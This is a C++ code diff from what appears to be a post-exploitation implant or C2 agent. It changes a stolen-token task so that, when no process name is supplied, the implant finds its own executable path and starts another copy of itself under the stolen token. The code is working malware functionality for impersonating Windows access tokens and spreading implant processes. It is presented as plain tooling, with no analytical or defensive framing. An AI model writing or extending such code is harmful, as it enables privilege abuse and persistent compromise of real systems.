@@ -101,11 +101,28 @@ namespace Task
                 return L"Error: Could not logon with impersonation.";
             }
         }
-        else
+        else if (wProcName != L"")
         {
             if (!Task::Helper::Token::CreateProcessWithStolenToken(pState->pProcs, hToken, wProcName.c_str()))
             {
                 return L"Error: Could not create a process with stolen token.";
+            }
+        }
+        else
+        {
+            // Start another implant process.
+
+            // Get current program (implant) path.
+            WCHAR wSelfPath[MAX_PATH];
+            DWORD dwResult = GetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
+            if (dwResult == 0)
+            {
+                return L"Error: Failed to get the program path.";
+            }
+            
+            if (!Task::Helper::Token::CreateProcessWithStolenToken(pState->pProcs, hToken, wSelfPath))
+            {
+                return L"Error: Failed to create another implant process.";
             }
         }
 
